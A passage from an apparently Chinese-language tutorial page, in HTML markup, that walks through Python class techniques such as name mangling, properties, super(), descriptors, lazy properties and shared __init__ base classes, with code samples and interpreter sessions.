class="line"></span><br><span class="line">    <span class="comment"># Does not override B.__private_method()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__private_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里，私有名称<code>__private</code>和<code>__private_method</code>被重命名为<code>_C__private</code>和<code>_C__private_method</code>，这个跟父类<code>B</code>中的名称是完全不同的。<br>大多数而言，你应该让你的非公共名称以单下划线开头。但是，如果你清楚你的代码会涉及到子类， 并且有些内部属性应该在子类中隐藏起来，那么才考虑使用双下划线方案。</p><h4 id="创建可管理的属性"><a href="#创建可管理的属性" class="headerlink" title="创建可管理的属性"></a>创建可管理的属性</h4><p>自定义某个属性的一种简单方法是将它定义为一个<code>property</code>。 例如，下面的代码定义了一个<code>property</code>，增加对一个属性简单的类型检查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, first_name)</span>:</span></span><br><span class="line">        self._first_name = first_name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Getter function</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._first_name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setter function</span></span><br><span class="line"><span class="meta">    @first_name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._first_name = value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deleter function (optional)</span></span><br><span class="line"><span class="meta">    @first_name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">"Can't delete attribute"</span>)</span><br></pre></td></tr></table></figure><p>上述代码中有三个相关联的方法，这三个方法的名字都必须一样。 第一个方法是一个<code>getter</code>函数，它使得<code>first_name</code>成为一个属性。 其他两个方法给<code>first_name</code>属性添加了<code>setter</code>和<code>deleter</code>函数。 需要强调的是只有在<code>first_name</code>属性被创建后， 后面的两个装饰器<code>@first_name.setter</code>和<code>@first_name.deleter</code>才能被定义。<code>property</code>的一个关键特征是它看上去跟普通的<code>attribute</code>没什么两样， 但是访问它的时候会自动触发<code>getter</code>、<code>setter</code>和<code>deleter</code>方法。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Person(<span class="string">'Guido'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.first_name <span class="comment"># Calls the getter</span></span><br><span class="line"><span class="string">'Guido'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.first_name = <span class="number">42</span> <span class="comment"># Calls the setter</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"prop.py"</span>, line <span class="number">14</span>, <span class="keyword">in</span> first_name</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">TypeError: Expected a string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a.first_name</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can`t delete attribute</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="调用父类方法"><a href="#调用父类方法" class="headerlink" title="调用父类方法"></a>调用父类方法</h4><p>为了调用父类(超类)的一个方法，可以使用<code>super()</code>函数，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>)</span><br><span class="line">        super().spam()</span><br></pre></td></tr></table></figure><p><code>super()</code>函数的一个常见用法是在<code>__init__()</code>方法中确保父类被正确的初始化了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.y = <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>super()</code>的另外一个常见用法出现在覆盖<code>Python</code>特殊方法的代码中，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        self._obj = obj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delegate attribute lookup to internal obj</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._obj, name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delegate attribute assignment</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__setattr__(name, value) <span class="comment"># Call original __setattr__</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setattr(self._obj, name, value)</span><br></pre></td></tr></table></figure><p>在上面代码中，<code>__setattr__()</code>的实现包含一个名字检查。如果某个属性名以下划线<code>(_)</code>开头，就通过<code>super()</code>调用原始的<code>__setattr__()</code>， 否则的话就委派给内部的代理对象<code>self._obj</code>去处理。因为就算没有显式的指明某个类的父类，<code>super()</code>仍然可以有效的工作。</p><h4 id="子类中扩展property"><a href="#子类中扩展property" class="headerlink" title="子类中扩展property"></a>子类中扩展property</h4><p>如下代码定义了一个<code>property</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Getter function</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setter function</span></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._name = value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deleter function</span></span><br><span class="line"><span class="meta">    @name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">"Can't delete attribute"</span>)</span><br></pre></td></tr></table></figure><p>下面是一个示例类，它继承自<code>Person</code>并扩展了<code>name</code>属性的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubPerson</span><span class="params">(Person)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting name'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Setting name to'</span>, value)</span><br><span class="line">        super(SubPerson, SubPerson).name.__set__(self, value)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Deleting name'</span>)</span><br><span class="line">        super(SubPerson, SubPerson).name.__delete__(self)</span><br></pre></td></tr></table></figure><p>如果仅仅只想扩展<code>property</code>的某一个方法，那么可以像下面这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubPerson</span><span class="params">(Person)</span>:</span></span><br><span class="line"><span class="meta">    @Person.name.getter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting name'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().name</span><br></pre></td></tr></table></figure><h4 id="创建新的类或实例属性"><a href="#创建新的类或实例属性" class="headerlink" title="创建新的类或实例属性"></a>创建新的类或实例属性</h4><p>如果想创建一个全新的实例属性，可以通过一个描述器类的形式来定义它的功能，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Integer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> instance.__dict__[self.name]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, instance, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected an int'</span>)</span><br><span class="line">        instance.__dict__[self.name] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delete__</span><span class="params">(self, instance)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> instance.__dict__[self.name]</span><br></pre></td></tr></table></figure><p>一个描述器就是一个实现了三个核心的属性访问操作(<code>get,set,delete</code>)的类，分别为(<code>__get__(),__set__(),__delete__()</code>)这三个特殊的方法，这些方法接受一个实例作为输入，之后相应的操作实例底层的字典。为了使用一个描述器，需将这个描述器的实例作为类属性放到一个类的定义中，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    x = Integer(<span class="string">'x'</span>)</span><br><span class="line">    y = Integer(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br></pre></td></tr></table></figure><p>这样做所有对描述器属性（如x或y）的访问会被（<code>__get__(),__set__(),__delete__()</code>）方法捕获到，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.x <span class="comment"># Calls Point.x.__get__(p,Point)</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.y = <span class="number">5</span> <span class="comment"># Calls Point.y.__set__(p, 5)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.x = <span class="number">2.3</span> <span class="comment"># Calls Point.x.__set__(p, 2.3)</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"descrip.py"</span>, line <span class="number">12</span>, <span class="keyword">in</span> __set__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected an int'</span>)</span><br><span class="line">TypeError: Expected an int</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>作为输入，描述器的每一个方法会接受一个操作实例。为了实现请求操作，会相应的操作实例底层的字典(<code>__dict__</code>属性)。 描述器的<code>self.name</code>属性存储了在实例字典中被实际使用到的<code>key</code>。</p><p>需要注意的是：描述器只能在类级别被定义，而不能为每个实例单独定义。因此，下面的代码是无法工作的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = Integer(<span class="string">'x'</span>) <span class="comment"># 错误，必须是类变量</span></span><br><span class="line">        self.y = Integer(<span class="string">'y'</span>)</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br></pre></td></tr></table></figure><h4 id="使用延迟计算属性"><a href="#使用延迟计算属性" class="headerlink" title="使用延迟计算属性"></a>使用延迟计算属性</h4><p>如果想将一个只读属性定义成一个<code>property</code>，并且只在访问的时候才会计算结果。 但是一旦被访问后，你希望结果值被缓存起来，不用每次都去计算。可以使用一个描述器类，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lazyproperty</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = self.func(instance)</span><br><span class="line">            setattr(instance, self.func.__name__, value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><p>使用上述描述器类示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, radius)</span>:</span></span><br><span class="line">        self.radius = radius</span><br><span class="line"></span><br><span class="line"><span class="meta">    @lazyproperty</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Computing area'</span>)</span><br><span class="line">        <span class="keyword">return</span> math.pi * self.radius ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @lazyproperty</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">perimeter</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Computing perimeter'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * math.pi * self.radius</span><br></pre></td></tr></table></figure><p>交互环境演示如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.radius</span><br><span class="line"><span class="number">4.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.perimeter</span><br><span class="line">Computing perimeter</span><br><span class="line"><span class="number">25.132741228718345</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.perimeter</span><br><span class="line"><span class="number">25.132741228718345</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>可以发现<code>Computing area</code>和<code>Computing perimeter</code>只出现了一次。</p><p>这种方案有一个小缺陷就是计算出的值被创建后是可以被修改的。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area = <span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">25</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果想要修改这个问题可以使用如下方式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazyproperty</span><span class="params">(func)</span>:</span></span><br><span class="line">    name = <span class="string">'_lazy_'</span> + func.__name__</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lazy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(self, name):</span><br><span class="line">            <span class="keyword">return</span> getattr(self, name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = func(self)</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">return</span> lazy</span><br></pre></td></tr></table></figure><p>这种方式不允许修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area = <span class="number">25</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can<span class="string">'t set attribute</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="简化数据结构的初始化"><a href="#简化数据结构的初始化" class="headerlink" title="简化数据结构的初始化"></a>简化数据结构的初始化</h4><p>如果不想写太多<code>__init__()</code>函数，可以在一个基类中写一个公用的<code>__init__()</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure1</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(self._fields):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> zip(self._fields, args):</span><br><span class="line">            setattr(self, name, value)</span><br></pre></td></tr></table></figure><p>然后让写的类继承上述基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'x'</span>, <span class="string">'y'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'radius'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> math.pi * self.radius ** <span class="number">2</span></span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"structure.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> __init__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line">TypeError: Expected <span class="number">3</span> arguments</span><br></pre></td></tr></table></figure><p>除此之外，还可以将不在<code>_fields</code>中的名称加入到属性中去，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure3</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 